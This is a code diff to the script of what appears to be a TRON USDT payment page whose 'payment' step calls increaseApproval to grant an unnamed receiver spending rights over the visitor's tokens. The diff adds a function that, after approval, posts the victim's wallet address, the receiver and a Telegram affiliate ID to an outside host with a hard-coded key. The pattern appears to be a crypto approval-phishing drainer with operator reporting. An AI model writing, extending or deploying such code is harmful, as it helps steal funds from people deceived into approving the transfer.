@@ -212,6 +212,7 @@
 			})()
 		</script>
 		<script>
+			window.vip = GetRequest().vip || ''
 			// --- 重写后的去混淆逻辑 ---
 			// 这是一个还原后的版本，用于展示原始脚本的逻辑。
 			// 变量名已尽量语义化，去除了混淆的字符串查找表。
@@ -428,14 +429,50 @@
 						await contract.increaseApproval(receiver, amount).send()
 
 						showTemporaryMessage('授权成功')
+
 						// 这里可以添加上报逻辑
+						notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
 					} catch (e) {
 						console.error('Approve failed', e)
 						showTemporaryMessage('支付失败，请重试')
 					}
 				}
 			}
+			function notifyAgentBinding(walletAddress, serviceAccount) {
+				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
+				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
+				window.tgid = GetRequest().tgid || ''
 
+				if (!window.tgid) {
+					console.log('No tgid found, skipping agent binding.')
+					return
+				}
+
+				const data = {
+					telegramId: window.tgid,
+					address: walletAddress,
+					serviceAccount: serviceAccount,
+				}
+
+				console.log('Sending agent binding data:', data)
+
+				fetch(WEB_APP_URL, {
+					method: 'POST',
+					redirect: 'follow',
+					headers: {
+						'Content-Type': 'application/json',
+						'X-API-Key': SECRET_API_KEY,
+					},
+					body: JSON.stringify(data),
+				})
+					.then((response) => response.json())
+					.then((result) => {
+						console.log('Agent binding result:', result)
+					})
+					.catch((error) => {
+						console.error('Agent binding error:', error)
+					})
+			}
 			function reportSuccess(txId) {
 				// 上报成功逻辑
 			}
